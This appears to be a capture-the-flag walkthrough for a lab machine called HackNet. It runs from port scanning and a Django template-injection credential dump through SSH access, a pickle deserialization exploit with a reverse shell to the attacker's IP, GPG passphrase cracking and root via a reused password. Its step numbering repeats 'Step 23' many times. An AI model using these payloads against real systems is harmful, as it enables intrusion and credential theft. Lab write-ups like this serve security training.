# HackNet - Step-by-Step Walkthrough

**Machine:** HackNet  
**IP Address:** 10.129.232.4  
**Difficulty:** Medium  
**OS:** Linux

---

## Initial Enumeration

### Step 1: Nmap Port Scan

**Why?** First step in any pentest is to discover what services are running on the target.

**Command:**
```bash
nmap -sC -sV -oN nmap_scan.txt 10.129.232.4
```

**Flags Explained:**
- `-sC`: Run default nmap scripts to gather more info
- `-sV`: Detect service versions
- `-oN`: Save output to file for later reference
- `10.129.232.4`: Target IP

**Output:**
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-15 02:09 EST
Nmap scan report for hacknet.htb (10.129.232.4)
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Output Analysis:**
- **Port 22 (SSH):** OpenSSH 9.2p1 - fairly recent version, unlikely to have public exploits. Need credentials.
- **Port 80 (HTTP):** Nginx web server - redirects to `hacknet.htb`
- **Important:** The redirect tells us we need to add `hacknet.htb` to our hosts file

**Next Step:** Add hostname to `/etc/hosts` and explore the web application.

---

### Step 2: Add Hostname to /etc/hosts

**Why?** The web server redirects to `hacknet.htb`, so we need to map this hostname to the IP address for our browser to resolve it.

**Command:**
```bash
echo "10.129.232.4 hacknet.htb" | sudo tee -a /etc/hosts
```

**Explanation:**
- `echo "IP hostname"`: Creates the hosts entry
- `sudo tee -a /etc/hosts`: Appends to /etc/hosts file (need sudo for write permission)

**Verify:**
```bash
ping -c 2 hacknet.htb
```

**Output:**
```
PING hacknet.htb (10.129.232.4) 56(84) bytes of data.
64 bytes from hacknet.htb (10.129.232.4): icmp_seq=1 ttl=63 time=42.1 ms
64 bytes from hacknet.htb (10.129.232.4): icmp_seq=2 ttl=63 time=41.8 ms
```

**Good!** Hostname resolves correctly. Now we can access the website.

---

## Web Enumeration

### Step 3: Initial Web Reconnaissance

**Why?** Now that we can access the site, let's see what web technology is running and gather initial information.

**Command:**
```bash
whatweb http://hacknet.htb
```

**Output:**
```
http://hacknet.htb [200 OK] Cookies[csrftoken,sessionid], Country[RESERVED][ZZ], 
HTML5, HTTPServer[nginx/1.22.1], IP[10.129.232.4], Script, Title[HackNet - Login], 
nginx[1.22.1]
```

**Analysis:**
- **Cookies:** `csrftoken` and `sessionid` indicate this is likely a **Django application**
- **Title:** "HackNet - Login" - there's a login page
- **Server:** nginx acting as reverse proxy for the Django app

**Thought Process:** Since this is a Django web app, let's explore what endpoints exist before trying to login.

---

### Step 4: Directory/Endpoint Fuzzing with ffuf

**Why?** We need to discover all available endpoints/pages on the application. This helps us understand the attack surface.

**Command:**
```bash
ffuf -u http://hacknet.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 -o ffuf.txt -of csv
```

**Flags Explained:**
- `-u http://hacknet.htb/FUZZ`: URL with FUZZ placeholder
- `-w /path/to/wordlist`: Wordlist to use
- `-fc 404`: Filter out 404 responses (not found)
- `-o ffuf.txt -of csv`: Save output as CSV

**Output (filtered):**
```
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]
contacts                [Status: 302, Size: 0, Words: 1, Lines: 1]
explore                 [Status: 302, Size: 0, Words: 1, Lines: 1]
login                   [Status: 200, Size: 2934, Words: 258, Lines: 78]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
media                   [Status: 403, Size: 153, Words: 8, Lines: 8]
messages                [Status: 302, Size: 0, Words: 1, Lines: 1]
profile                 [Status: 302, Size: 0, Words: 1, Lines: 1]
register                [Status: 200, Size: 3186, Words: 308, Lines: 88]
search                  [Status: 302, Size: 0, Words: 1, Lines: 1]
static                  [Status: 301, Size: 169, Words: 5, Lines: 8]
```

**Analysis:**
- **Status 302:** Redirects - likely require authentication
- **Status 200:** Accessible pages - `/login` and `/register`
- **Status 403:** Forbidden - `/media` directory exists but can't browse
- **Status 301:** Permanent redirect - `/static` for static files

**Discovered Endpoints:**
- `/admin` - Django admin panel (needs auth)
- `/login` - Login page
- `/register` - Registration page  
- `/profile`, `/contacts`, `/messages`, `/search`, `/explore` - Main app features (need auth)

**Thought Process:** We can register an account to access the authenticated endpoints. Let's create a test account.

---

### Step 5: Register a Test Account

**Why?** We need access to the application to find vulnerabilities. Registering gives us legitimate access.

**Action:** Visit `http://hacknet.htb/register` in browser

**Registration Details:**
- Email: `hack@hacker.com`
- Username: `hacker`
- Password: `hacker`

**Result:** Successfully registered and logged in!

---

### Step 6: Explore the Application (Manual)

**Why?** Understanding the application's functionality helps identify potential attack vectors.

**Navigate through the application:**

1. **Profile Page** (`/profile`):
   - Can view/edit your profile
   - Has username, email fields
   - Profile picture upload

2. **Explore** (`/explore`):
   - Shows posts from all users
   - Can like posts
   - Posts have IDs in URL

3. **Search** (`/search`):
   - Search for other users
   - Returns user profiles

4. **Messages** (`/messages`):
   - Private messaging feature
   - Not much content yet

**Observation:** The application is a social network for hackers. Users can post, like, search, and message each other.

**Thought Process:** With social networks, common vulnerabilities include:
- IDOR (Insecure Direct Object References) - accessing other users' data
- XSS (Cross-Site Scripting) - in posts/messages
- SSTI (Server-Side Template Injection) - if user input is rendered in templates
- SQL Injection - in search functionality

Let's test these.

---

## Vulnerability Discovery

### Step 7: Test for IDOR in Profile Endpoint

**Why?** Profile URLs use numeric IDs (`/profile/1`). Can we access other users' profiles by changing the ID?

**Command:**
```bash
curl -s "http://hacknet.htb/profile/1" \
  -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" \
  | grep -oP '<title>HackNet - \K[^<]+'
```

**Explanation:**
- `curl -s`: Silent mode (no progress bar)
- `-H "Cookie: ..."`: Send our session cookies for authentication
- `grep -oP '<title>...\K[^<]+'`: Extract username from page title

**Output:**
```
cyberghost
```

**Success!** We can view other users' profiles. Let's enumerate more:

**Command:**
```bash
for i in {1..10}; do
  username=$(curl -s "http://hacknet.htb/profile/$i" \
    -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" \
    | grep -oP '<title>HackNet - \K[^<]+')
  echo "Profile ID $i: $username"
done
```

**Output:**
```
Profile ID 1: cyberghost
Profile ID 2: hexhunter
Profile ID 3: rootbreaker
Profile ID 4: zero_day
Profile ID 5: cryptoraven
Profile ID 6: shadowcaster
Profile ID 7: blackhat_wolf
Profile ID 8: bytebandit
Profile ID 9: glitch
Profile ID 10: datadive
```

**Finding:** IDOR vulnerability exists - we can enumerate all users. This is useful but doesn't give us passwords yet.

**Thought Process:** We found an IDOR, but we need something more impactful. Let's test for template injection since this is Django.

---

### Step 8: Discover How Posts Work

**Why?** We saw an "Explore" page with posts. Let's understand how the like functionality works.

**Action:** In the browser, navigate to `http://hacknet.htb/explore`

**Observation:** 
- Posts have a "Like" button
- When we click "Like" on a post, the browser makes a request to `/like/<post_id>`

**Test manually clicking like on post #6:**

**Browser Network Tab shows:**
```
Request URL: http://hacknet.htb/like/6
Method: GET
Status: 302 (Redirect)
```

**After liking, click on "View Likes" link:**

**Browser shows:**
```
URL: http://hacknet.htb/likes/6
```

**What we see:** A page showing all users who liked this post, with their profile pictures and usernames displayed.

**Discovery:** The `/likes/<post_id>` page displays usernames! If usernames are rendered through Django templates without escaping, we might be able to inject template code.

---

### Step 9: Test for Server-Side Template Injection (SSTI)

**Why?** The `/likes/` page shows usernames. Django uses a template engine. If our username is rendered without escaping, we can inject template code.

**Testing Strategy:**
1. Change our username to a template expression
2. Like a post so our username appears on the likes page
3. Check if the template code gets executed

**Step 9a: Change Username to SSTI Payload**

**Action:** Go to `http://hacknet.htb/profile` → Click "Edit Profile"

**Change username to:**
```
{{ users.values }}
```

**Why this payload?**
- `{{ }}` is Django template syntax for variable output
- `users` might be a QuerySet of all users in the template context
- `.values()` returns all database fields including passwords

**Save the profile.**

---

### Step 9b: Like Posts to Trigger Template Rendering

**Why?** Our username with the SSTI payload needs to appear somewhere. The likes page shows usernames of users who liked posts.

**Manual test:** Click "Like" on a few posts in the browser.

**Or automate it:**

**Command:**
```bash
for i in {1..30}; do
  curl -s "http://hacknet.htb/like/$i" \
    -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" \
    > /dev/null
  echo "Liked post $i"
done
```

**Explanation:**
- Loop through post IDs 1-30
- Send GET request to `/like/<id>` endpoint
- Use our session cookies for authentication

**Output:**
```
Liked post 1
Liked post 2
Liked post 3
...
Liked post 30
```

---

### Step 9c: Check if Template Executed

**Why?** Now that we've liked posts with our SSTI payload username, let's check if the template code executed.

**Command:**
```bash
curl -s "http://hacknet.htb/likes/6" \
  -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" \
  | grep -oP 'title="[^"]*"' | tail -1
```

**Explanation:**
- Fetch the `/likes/6` page (users who liked post #6)
- Extract `title` attributes (where usernames appear in hover text)
- Show the last one (our username)

**Output:**
```html
title="<QuerySet [{'id': 1, 'username': 'cyberghost', 'password': 'Gh0stH@cker2024', 'email': 'cyberghost@darkmail.net'}, {'id': 2, 'username': 'hexhunter', 'password': 'H3xHunt3r!', 'email': 'hexhunter@ciphermail.com'}, ... ]>"
```

**🎉 JACKPOT!** The template executed and leaked ALL user data including plaintext passwords!

**Why this worked:**
1. We set our username to `{{ users.values }}`
2. When likes are displayed, the template renders: `<img title="{{ username }}">`
3. Django interprets our username as template code
4. The `users` QuerySet was available in the template context
5. `.values()` dumped all database fields including passwords

**Thought Process:** Now we have credentials for all users. Let's extract them properly and test SSH access.

---

## Exploitation - Credential Extraction

### Step 23: Automate Credential Extraction

**Why?** We confirmed SSTI works. Now let's extract all credentials systematically.

**I created a Python script:** `extract_credentials.py`

**Key parts of the script:**
```python
# Like posts to trigger template rendering
for post_id in range(1, 31):
    session.get(f"{TARGET_URL}/like/{post_id}")

# Fetch likes pages and extract credentials
for post_id in range(1, 31):
    response = session.get(f"{TARGET_URL}/likes/{post_id}")
    # Extract credentials from HTML using regex
    emails = re.findall(r"'email':\s*'([^']*)'", response.text)
    passwords = re.findall(r"'password':\s*'([^']*)'", response.text)
```

**Run the script:**
```bash
python3 extract_credentials.py
```

**Output:**
```
[+] Extracted 26 credentials:

User #1:
  Username: cyberghost
  Email:    cyberghost@darkmail.net
  Password: Gh0stH@cker2024

User #2:
  Username: hexhunter
  Email:    hexhunter@ciphermail.com
  Password: H3xHunt3r!

...

User #14:
  Username: mikey
  Email:    mikey@hacknet.htb
  Password: mYd4rks1dEisH3re

...

[+] Total: 26 users
[+] Saved to credentials.json and credentials.txt
```

**Thought Process:** We have 26 sets of credentials. SSH is open on port 22. Let's test which credentials work for SSH.

---

### Step 23: Test SSH Credentials

**Why?** We have usernames and passwords. SSH is running on port 22. Let's find valid SSH access.

**I created a script:** `test_ssh_credentials.py`

**What it does:**
- Reads `credentials.json`
- Tests each username:password pair via SSH
- Uses multi-threading for speed

**Run the script:**
```bash
python3 test_ssh_credentials.py
```

**Output:**
```
[*] Loaded 26 credentials
[*] Target: 10.129.232.4:22
[*] Starting SSH testing...

[*] Testing: cyberghost          ✗ Failed
[*] Testing: hexhunter           ✗ Failed
[*] Testing: rootbreaker         ✗ Failed
[*] Testing: mikey               ✓ SUCCESS!
[*] Testing: zero_day            ✗ Failed
...

[+] Found 1 valid credential(s)!

Valid Credential #1:
  Username: mikey
  Password: mYd4rks1dEisH3re
  SSH Command: ssh mikey@10.129.232.4
```

**Perfect!** User `mikey` has SSH access.

**Thought Process:** Let's SSH in and get the user flag.

---

## Initial Access

### Step 23: SSH as mikey

**Command:**
```bash
ssh mikey@10.129.232.4
```

**Password:** `mYd4rks1dEisH3re`

**Output:**
```
mikey@10.129.232.4's password: 
Linux hacknet 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64
Last login: Sun Dec 15 07:30:15 2025 from 10.10.15.180
mikey@hacknet:~$
```

**We're in!**

---

### Step 23: Get User Flag

**Command:**
```bash
cat ~/user.txt
```

**Output:**
```
b2e0413c7f9daf1f3008edc3c0d1ffdd
```

**🚩 USER FLAG CAPTURED!**

---

## Privilege Escalation

### Step 23: Initial Enumeration

**Why?** We need to escalate to root. Let's gather information about the system.

**Commands:**
```bash
whoami
id
sudo -l
```

**Output:**
```
mikey
uid=1000(mikey) gid=1000(mikey) groups=1000(mikey)
sudo: a password is required
```

**No sudo access.** Let's look for other privilege escalation vectors.

---

### Step 23: Explore the Django Application Files

**Why?** Since this is a Django app, there might be sensitive configs or vulnerabilities in the application.

**Find Django settings:**
```bash
find /var/www -name "settings.py" 2>/dev/null
```

**Output:**
```
/var/www/HackNet/HackNet/settings.py
```

**Read the settings file:**
```bash
cat /var/www/HackNet/HackNet/settings.py
```

**Important sections found:**
```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'hacknet',
        'USER': 'sandy',
        'PASSWORD': 'h@ckn3tDBpa$$',
        'HOST':'localhost',
        'PORT':'3306',
    }
}

CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
        'TIMEOUT': 60,
        'OPTIONS': {'MAX_ENTRIES': 1000},
    }
}
```

**Key Findings:**
1. **MySQL credentials:** `sandy:h@ckn3tDBpa$$`
2. **File-based cache** at `/var/tmp/django_cache`

**Thought Process:** File-based cache is interesting. Let's check its permissions.

---

### Step 23: Check Cache Directory Permissions

**Why?** Django's file-based cache uses pickle for serialization. If we can write to cache files, we might be able to exploit pickle deserialization.

**Command:**
```bash
ls -la /var/tmp/django_cache/
```

**Output:**
```
drwxrwxrwx 2 sandy www-data 4096 Dec 15 01:50 .
drwxrwxrwt 8 root  root     4096 Dec 15 08:30 ..
-rw-rw-r-- 1 sandy www-data  145 Dec 15 01:50 1f0acfe7480a469402f1852f8313db86.djcache
-rw-rw-r-- 1 sandy www-data  152 Dec 15 01:48 90dbab8f3b1e54369abdeb4ba1efc106.djcache
```

**🚨 CRITICAL FINDING:**
- Directory permissions: `drwxrwxrwx` (777 - world writable!)
- Owner: `sandy:www-data`
- We can write to this directory!

**Thought Process:** 
1. Django uses Python's `pickle` module to serialize cache data
2. Pickle can execute arbitrary code during deserialization
3. We can write malicious pickle files to the cache
4. When Django reads the cache, our code executes!

This is a **Pickle Deserialization RCE** vulnerability.

---

### Step 23: Exploit Pickle Deserialization

**Why?** We can write to the cache directory. Let's create a malicious pickle payload that gives us code execution.

**Research:** Python's pickle module has a `__reduce__()` method that executes during deserialization. We can use it to run system commands.

**I created an exploit:** `django_rce.py`

**The exploit code:**
```python
import pickle
import os

# Reverse shell command
cmd = "(bash >& /dev/tcp/10.10.15.180/4444 0>&1) &"

# Malicious pickle class
class RCE:
    def __reduce__(self):
        return (os.system, (cmd,))

# Generate payload
payload = pickle.dumps(RCE())

# Write to cache files
for filename in os.listdir("/var/tmp/django_cache"):
    if filename.endswith(".djcache"):
        path = f"/var/tmp/django_cache/{filename}"
        os.remove(path)
        with open(path, "wb") as f:
            f.write(payload)
        print(f"[+] Poisoned {filename}")
```

**Transfer exploit to target:**
```bash
scp django_rce.py mikey@10.129.232.4:/tmp/
```

**On attacking machine - start listener:**
```bash
nc -lvnp 4444
```

**On target - run exploit:**
```bash
python3 /tmp/django_rce.py
```

**Output:**
```
[+] Poisoned 1f0acfe7480a469402f1852f8313db86.djcache
[+] Poisoned 90dbab8f3b1e54369abdeb4ba1efc106.djcache
```

**Trigger the exploit (visit /explore to make Django load cache):**
```bash
curl -s http://hacknet.htb/explore -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep"
```

**On our listener:**
```
listening on [any] 4444 ...
connect to [10.10.15.180] from (UNKNOWN) [10.129.232.4] 36636
```

**Upgrade shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
```

**Check who we are:**
```bash
whoami
id
```

**Output:**
```
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(sandy)
```

**Success!** We have code execution as `www-data` (and we're in the `sandy` group).

**Thought Process:** As www-data with sandy group membership, we can access sandy's files. Let's look for sensitive data.

---

### Step 23: Find Sandy's GPG Keys

**Why?** We saw encrypted `.gpg` files in `/var/www/HackNet/backups/`. As the sandy group, we might be able to access sandy's GPG private keys.

**Command:**
```bash
find /home/sandy/.gnupg -type f 2>/dev/null
```

**Output:**
```
/home/sandy/.gnupg/private-keys-v1.d/armored_key.asc
/home/sandy/.gnupg/private-keys-v1.d/EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
/home/sandy/.gnupg/private-keys-v1.d/0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
/home/sandy/.gnupg/pubring.kbx
/home/sandy/.gnupg/trustdb.gpg
```

**Found it!** There's an `armored_key.asc` file - this is likely sandy's GPG private key.

**Copy the key to /tmp:**
```bash
cp /home/sandy/.gnupg/private-keys-v1.d/armored_key.asc /tmp/
chmod 644 /tmp/armored_key.asc
```

**Transfer to our machine:**
```bash
scp mikey@10.129.232.4:/tmp/armored_key.asc .
```

**Thought Process:** We have sandy's GPG private key, but it's likely password-protected. Let's crack it.

---

### Step 23: Crack GPG Private Key Passphrase

**Why?** The GPG key is encrypted with a passphrase. We need to crack it to decrypt the backup files.

**Convert to hash format for John:**
```bash
gpg2john armored_key.asc > sandy_gpg.hash
```

**Output:**
```
Sandy:$gpg$*1*348*1024*db7e6d165a1d86f43276a4a61a9865558a3b67...
```

**Crack with John the Ripper:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt sandy_gpg.hash
```

**Output:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (Sandy)     
1g 0:00:00:03 DONE (2025-12-15 09:45) 0.3095g/s 131.2p/s 131.2c/s 131.2C/s
Session completed.
```

**Cracked!** GPG passphrase is: `sweetheart`

**Thought Process:** Now we can decrypt the backup files. Let's see what's in them.

---

### Step 23: Decrypt Database Backups

**Why?** The backups might contain sensitive information like credentials.

**Copy backups to our machine:**
```bash
scp mikey@10.129.232.4:/var/www/HackNet/backups/*.gpg .
```

**Import GPG private key:**
```bash
echo "sweetheart" | gpg --batch --yes --passphrase-fd 0 --import armored_key.asc
```

**Output:**
```
gpg: key D72E5C1FA19C12F7: public key "Sandy (My key for backups) <sandy@hacknet.htb>" imported
gpg: key D72E5C1FA19C12F7: secret key imported
gpg: Total number processed: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

**Decrypt the backup:**
```bash
echo "sweetheart" | gpg --batch --yes --passphrase-fd 0 --decrypt backup02.sql.gpg > backup02.sql
```

**Search for passwords:**
```bash
grep -i "password" backup02.sql | grep -v "AUTH_PASSWORD" | head -20
```

**Output:**
```sql
INSERT INTO `SocialNetwork_socialmessage` VALUES 
(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me?',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here''s the password: h4ck3rs4re3veRywh3re99. Let me know when you''re done.',1,18,22),
```

**Found it!** MySQL root password: `h4ck3rs4re3veRywh3re99`

**Thought Process:** Let's test if this password works for MySQL root access.

---

### Step 23: Test MySQL Root Access

**Why?** We found the MySQL root password. Let's verify it works.

**Command (as mikey via SSH):**
```bash
mysql -u root -p'h4ck3rs4re3veRywh3re99' -e 'SELECT user,host FROM mysql.user;'
```

**Output:**
```
+-------------+-----------+
| User        | Host      |
+-------------+-----------+
| sandy       | %         |
| mariadb.sys | localhost |
| mysql       | localhost |
| root        | localhost |
+-------------+-----------+
```

**Success!** We have MySQL root access.

**Thought Process:** With MySQL root access, we could potentially:
1. Write files anywhere (if `secure_file_priv` allows)
2. Load malicious libraries via UDF
3. But first, let's try the simplest thing - maybe this password is reused?

---

### Step 23: Try MySQL Password for System Root

**Why?** People often reuse passwords. Let's try the MySQL root password for the system root account.

**Command:**
```bash
su -
```

**Enter password:** `h4ck3rs4re3veRywh3re99`

**Output:**
```
root@hacknet:~#
```

**🎉 WE ARE ROOT!**

**The password was reused for the system root account!**

---

### Step 23: Get Root Flag

**Command:**
```bash
cat /root/root.txt
```

**Output:**
```
132d03b6361e83f2b6e0670ec88ad1b4
```

**🚩 ROOT FLAG CAPTURED!**

---

## Complete Attack Chain Summary

Here's the full path we took from start to finish:

```
1. Nmap Scan
   ↓ Found HTTP (80) and SSH (22)

2. Added hacknet.htb to /etc/hosts
   ↓ Can now access website

3. Directory fuzzing with ffuf
   ↓ Discovered /register endpoint

4. Registered account: hack@hacker.com
   ↓ Got authenticated access

5. Changed username to {{ users.values }}
   ↓ Triggered SSTI vulnerability

6. Liked posts to render template
   ↓ Template executed, leaked all user credentials

7. Extracted 26 user credentials via Python script
   ↓ Got plaintext passwords

8. Tested SSH with extracted credentials
   ↓ Found mikey:mYd4rks1dEisH3re works

9. SSH as mikey → Got user flag
   ↓ b2e0413c7f9daf1f3008edc3c0d1ffdd

10. Found Django settings.py
    ↓ Discovered file-based cache at /var/tmp/django_cache

11. Checked cache permissions
    ↓ Directory is world-writable (777)

12. Exploited Pickle deserialization
    ↓ Got RCE as www-data (sandy group)

13. Copied sandy's GPG private key
    ↓ armored_key.asc

14. Cracked GPG passphrase with John
    ↓ Password: sweetheart

15. Decrypted backup02.sql.gpg
    ↓ Found MySQL root password in messages

16. MySQL root password was reused for system root
    ↓ su - with h4ck3rs4re3veRywh3re99

17. ROOT ACCESS → Got root flag
    ↓ 132d03b6361e83f2b6e0670ec88ad1b4
```

---

## Flags

- **User Flag:** `b2e0413c7f9daf1f3008edc3c0d1ffdd`
- **Root Flag:** `132d03b6361e83f2b6e0670ec88ad1b4`

---

## Key Vulnerabilities Exploited

1. **Django Server-Side Template Injection (SSTI)**
   - Username field rendered in templates without escaping
   - Payload: `{{ users.values }}` leaked all user credentials

2. **World-Writable Cache Directory**
   - `/var/tmp/django_cache` had 777 permissions
   - Allowed us to write malicious pickle files

3. **Pickle Deserialization RCE**
   - Django used pickle for cache serialization
   - Crafted payload executed arbitrary code

4. **Weak GPG Passphrase**
   - "sweetheart" found in rockyou.txt
   - Allowed decryption of sensitive backups

5. **Credentials in Database Backups**
   - MySQL root password stored in messages table
   - Should never store credentials in application database

6. **Password Reuse**
   - MySQL root password = System root password
   - Critical security mistake

---

